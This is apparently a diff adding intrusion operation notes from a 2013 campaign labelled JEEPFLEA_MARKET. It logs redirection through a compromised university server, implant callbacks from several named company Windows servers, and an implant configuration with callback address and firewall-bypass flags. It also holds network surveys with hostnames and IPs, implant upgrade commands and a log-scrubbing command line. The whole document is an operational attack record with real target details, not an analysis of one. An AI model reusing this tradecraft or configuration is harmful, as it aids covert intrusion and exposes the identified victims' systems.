@@ -1,0 +1,303 @@
+ISP:	LK
+City:	
+Phone:	
+ISP IP:	79.172.193.160
+Source IP:	
+FINAL target IP:	
+Ops Machine:	LOCALHOST.LOCALDOMAIN
+Redirecting Method 1:	PITCHIMPAIR
+Redirect Host 1:	139.18.13.2
+Redirect Target 1:	192.168.208.11
+Redirecting Method 2:	INCISION
+Redirect Host 2:	192.168.208.11
+Redirect Target 2:	192.168.200.92
+Redirecting Method 3:	INCISION
+Redirect Host 3:	192.168.208.11
+Redirect Target 3:	192.168.200.104
+Redirecting Method 4:	INCISION
+Redirect Host 4:	192.168.208.11
+Redirect Target 4:	192.168.219.245
+
+
+BEGIN UNIX OPNOTES:
+
+Targets (IP, full domain name, target tags: pitchimpair unsuccessful not_attempted ) : 
+--> 139.18.13.2            isun02.informatik.uni-leipzig.de pitchimpair          unix      successful    
+---> 192.168.208.11        ensbdmgmt2.eastnets.com        jeepflea_market      windows   successful    
+----> 192.168.200.92       ensbdaldn1.eastnets.com        jeepflea_market      windows   successful    
+----> 192.168.200.104      ensbdsl3.eastnets.com          jeepflea_market      windows   successful    
+----> 192.168.219.245      ensbdftp1.eastnets.com         jeepflea_market      windows   successful    
+Ops Machine: WO
+Results:
+
+PROJECT=JEEPFLEA_MARKET
+OPUSER=33159
+OPSCHEDULE=13083019453124
+SCRUBVER=6.007000008
+
+139.18.13.2
+-----------
+ourtn -Y5wBIN -U /current/up/noserver 139.18.13.2
+2013-09-04 15:57:40 UTC -- nothing
+2013-09-04 15:58:53 UTC -- on target
+	  6:00pm  up 362 day(s), 23:26,  0 users,  load average: 4.12, 3.58, 3.50
+	Wed Sep  4 18:00:10 CEST 2013
+	- A41F65B7A04AD58DF1D4F91D97C94693BD2A8783 Sat Aug  8 01:23:18 2009 /bin/netstat - clear
+2013-09-04 16:01:57 UTC -- ran checks, all clear
+2013-09-04 21:26:19 UTC -- bB
+
+
+
+LOCALHOST.LOCALDOMAIN: scrubhands v. 6.007000008 20130904-1554
+###################
+SCRUBHANDS v6.007000008 (suite v6.7.0.08 run in /192.168.254.71) command line:
+:
+/usr/local/bin/scrubhands -t -S 13083019453124 -I 33159 -P JEEPFLEA_MARKET -n 212.92.23.5 79.172.193.160/192/129
+###################
+Final lines of bwmonitor.txt:
+Wed Sep 04 21:33:16 UTC 2013
+eth0        bytes      (MB)    packets     kbps    (kBps)   kbps-1m  kbps-10m   kbps-hr
+  TX     16034996    (15.3)      48981      0.0     (0.0)       1.2       0.5       2.2
+  RX     20821077    (19.9)      50221      0.0     (0.0)       5.0       1.5       4.2
+
+###################################################
+PROJECT: jeepflea_market
+DATE: 04:07 PM 09/04/2013
+OPUSER: 33159
+OPSCHEDULE: 13083019453124
+#Op Status: Unsuccessful
+#Non-Standard: True
+###################################################
+Targets:
+
+
+
+Results:
+
+z0.0.0.11 = 192.168.208.11
+z0.0.0.12 = 192.168.200.92
+z0.0.0.13 = 192.168.200.104
+z0.0.0.14 = 192.168.219.245
+
+192.168.208.11
+--------------
+win2k8 r2 sp1 64bit
+UR - CB 443, 48071
+
+4:27 PM 9/4/2013 - waiting on egg
+4:41 PM 9/4/2013 - nothing yet...
+
+- Configuration:
+- 
+- <?xml version='1.0' encoding='UTF-8' ?>
+- <PCConfig>
+-   <Flags>
+-     <PCHEAP_CONFIG_FLAG_CALLBACK_NOW/>
+-     <PCHEAP_CONFIG_FLAG_IGNORE_WIN_FIREWALL/>
+-     <PCHEAP_CONFIG_FLAG_DONT_CREATE_WINDOW/>
+-   </Flags>
+-   <Id>0x0</Id>
+-   <StartListenHour>0</StartListenHour>
+-   <StopListenHour>0</StopListenHour>
+-   <CallbackAddress>139.18.13.2</CallbackAddress>
+-   <CallbackPorts>
+-     <CallbackPair>
+-       <SrcPort>0</SrcPort>
+-       <DstPort>443</DstPort>
+-     </CallbackPair>
+-     <CallbackPair>
+-       <SrcPort>0</SrcPort>
+-       <DstPort>48071</DstPort>
+-     </CallbackPair>
+-   </CallbackPorts>
+- </PCConfig>
+
+4:55 PM 9/4/2013 - waiting 6min
+5:03 PM 9/4/2013 - go CB
+    Process Id : 628
+    \___ running out of svchost.exe
+    
+   Uptime: 4 days, 5:40:6 
+    
+5:07 PM 9/4/2013 - not dorking, redirecting only
+    
+    - Memory Load       : 59%%
+    - Physical Available: 2482 M
+    - Physical Total    : 6141 M
+    
+    | Drive |  Serial   | Type  |    In use (MB)      | Change (MB) |
+    +-------+-----------+-------+---------------------+-------------+
+    | C     | 7e21-d059 | Fixed | 39246/40975 (95%%)  |           0 |
+    | D     | f028-dfdd | Fixed | 24854/81915 (30%%)  |           0 |
+    | E     | 745f-d1c6 | Fixed | 54792/349872 (15%%) |           0 |
+    | F     | dc32-e5cd | Fixed | 15981/17089 (93%%)  |           0 |
+    | G     |           | Cdrom |                     |             |
+    
+5:17 PM 9/4/2013 - hour clear, survey done
+    REPLY from 192.168.200.92 -> 192.168.208.11 -- TTL: 128
+    REPLY from 192.168.216.110 -> 192.168.208.11 -- TTL: 125
+        ---------------------------------------------------------------------
+        ENSBJMGMT1          UNIQUE REGISTERED        Workstation Service
+        WORKGROUP           GROUP REGISTERED         Domain Name
+        ENSBJMGMT1          UNIQUE REGISTERED        File Server Service
+        WORKGROUP           GROUP REGISTERED         Browser Service Elections
+        WORKGROUP           UNIQUE REGISTERED        Master Browser
+        ??__MSBROWSE__?     GROUP REGISTERED         Master Browser
+
+        Adapter Address: 00.22.64.9b.a1.d0
+        Adapter Type   : Ethernet Adapter
+    
+    REPLY from 192.168.219.246 -> 192.168.208.11 -- TTL: 128
+        ---------------------------------------------------------------------
+        ENSBDFTP2           UNIQUE REGISTERED        Workstation Service
+        WORKGROUP           GROUP REGISTERED         Domain Name
+        ENSBDFTP2           UNIQUE REGISTERED        File Server Service
+
+        Adapter Address: 00.24.81.a7.4b.06
+        Adapter Type   : Ethernet Adapter
+    
+    REPLY from 192.168.219.245 -> 192.168.208.11 -- TTL: 128
+        ---------------------------------------------------------------------
+        ENSBDFTP1           UNIQUE REGISTERED        Workstation Service
+        WORKGROUP           GROUP REGISTERED         Domain Name
+        ENSBDFTP1           UNIQUE REGISTERED        File Server Service
+
+        Adapter Address: 00.17.a4.77.28.34
+        Adapter Type   : Ethernet Adapter    
+    
+    172.16.104.17 - no bueno
+    
+6:47 PM 9/4/2013 - trace to pitch
+    1  192.168.206.4  1ms
+    2  80.227.254.194  1ms
+    3  213.132.54.52  2ms
+    4  172.16.216.69  2ms
+    5  10.100.34.97  3ms
+    6  10.100.34.78  4ms
+    7  10.100.34.98  7ms
+    8  10.44.247.93  8ms
+    9  94.201.0.53  9ms
+    10  10.44.24.146  177ms
+    11  212.113.15.65  151ms
+    12  4.69.166.157  152ms
+    13  4.69.153.133  152ms
+    14  4.69.148.190  149ms
+    15  4.69.140.30  160ms
+    16  4.69.154.201  147ms
+    17  212.162.4.6  154ms
+    18  188.1.144.101  197ms
+    19  188.1.144.185  168ms
+    20  188.1.50.10  174ms
+    21  141.57.252.1  168ms
+    22  139.18.13.2  169ms
+    
+    REPLY from 192.168.200.230 -> 192.168.208.11 -- TTL: 128
+        ---------------------------------------------------------------------
+        ENDPGBTS2           UNIQUE REGISTERED        Workstation Service
+        ENSB                GROUP REGISTERED         Domain Name
+        ENDPGBTS2           UNIQUE REGISTERED        File Server Service
+        ENSB                GROUP REGISTERED         Browser Service Elections
+
+        Adapter Address: 00.1e.0b.4b.9d.88
+        Adapter Type   : Ethernet Adapter
+    
+9:25 PM 9/4/2013 - hour clear, Q&D    
+    
+192.168.200.92
+--------------
+win2k8 R2 Standard
+Symantec Endpoint Protection 11
+8,0 CB 39781 10001288e
+
+5:25 PM 9/4/2013 - trigger sent
+5:29 PM 9/4/2013 - nothing, changing CB ip
+5:32 PM 9/4/2013 - got CB
+    Process Id : 576
+    \____ running out of services.exe
+    
+    Uptime: 4 days, 12:54:11
+    
+    - Memory Load       : 58%%
+    - Physical Available: 5095 M
+    - Physical Total    : 12285 M
+    
+    | Drive |  Serial   | Type  |    In use (MB)     | Change (MB) |
+    +-------+-----------+-------+--------------------+-------------+
+    | C     | 6e60-26bc | Fixed | 33264/40975 (81%%) |           0 |
+    | D     | 48ec-6c42 | Fixed | 5075/40978 (12%%)  |           0 |
+    | E     | 600b-29de | Fixed | 13698/61461 (22%%) |           0 |
+    | F     | 3263-9842 | Fixed | 2425/30740 (7%%)   |           0 |
+    | G     | 5e25-fad9 | Fixed | 11623/19699 (59%%) |           0 |
+    | I     | 8277-8c5f | Fixed | 23404/92199 (25%%) |           0 |
+
+5:47 PM 9/4/2013 - hour clear, survey done   
+8:13 PM 9/4/2013 - Upgrading SOTI
+
+    kisu_install -type MOAN
+    kisu_uninstall -type MOAN
+    
+8:46 PM 9/4/2013 - hour clear, Q&D
+
+192.168.200.104
+---------------
+win2k8 r2 sp0 64bit
+Symantec Endpoint Protection 11
+8,0 CB 49562 0x1000125b8
+5:53 PM 9/4/2013 - trigger sent
+5:54 PM 9/4/2013 - got CB
+    Process Id : 592
+    \____ running out of services.exe
+    
+    Uptime: 4 days, 14:32:5
+    
+    - Memory Load       : 48%%
+    - Physical Available: 8518 M
+    - Physical Total    : 16381 M
+    
+    | Drive |  Serial   | Type  |    In use (MB)     | Change (MB) |
+    +-------+-----------+-------+--------------------+-------------+
+    | C     | 6e60-26bc | Fixed | 27273/40975 (66%%) |           0 |
+    | D     | b473-6b76 | Fixed | 5909/40959 (14%%)  |           0 |
+    | E     | 44a0-05eb | Fixed | 23869/92159 (25%%) |           0 |
+    | F     | 88b0-6f4d | Fixed | 11994/46073 (26%%) |           0 |
+    | G     | 0c16-8579 | Fixed | 7058/19811 (35%%)  |           0 |
+    | H     | a8c8-e176 | Fixed | 1574/46076 (3%%)   |           0 |
+    
+6:08 PM 9/4/2013 - ran checks, survey done
+8:12 PM 9/4/2013 - Upgrading SOTI
+
+    kisu_install -type MOAN
+    kisu_uninstall -type MOAN
+
+8:45 PM 9/4/2013 - hour clear, Q&D    
+    
+192.168.219.245
+---------------
+w2k8 64bit
+Symantec EP11
+8,0 CB 36176
+6:28 PM 9/4/2013 - sent
+    Process Id : 580
+    \_____ running out of services.exe
+    
+    Uptime: 4 days, 13:54:14
+    
+    - Memory Load       : 19%%
+    - Physical Available: 6578 M
+    - Physical Total    : 8189 M
+    
+    | Drive |  Serial   | Type  |    In use (MB)     | Change (MB) |
+    +-------+-----------+-------+--------------------+-------------+
+    | C     | 7e21-d059 | Fixed | 21184/40975 (51%%) |           0 |
+    | D     | 1087-f9ee | Fixed | 4220/20489 (20%%)  |           0 |
+    | E     | dc06-2ba9 | Fixed | 26760/56321 (47%%) |           0 |
+    | F     | ec0c-3499 | Fixed | 90/15394 (0%%)     |           0 |
+    | G     | 26ff-0963 | Fixed | 1685/6786 (24%%)   |           0 |
+    
+6:41 PM 9/4/2013 - hour clear, survey done
+8:09 PM 9/4/2013 - Upgrading SOTI:
+
+    kisu_install -type MOAN
+    kisu_uninstall -type MOAN
+    
+9:15 PM 9/4/2013 - hour clear, Q&D
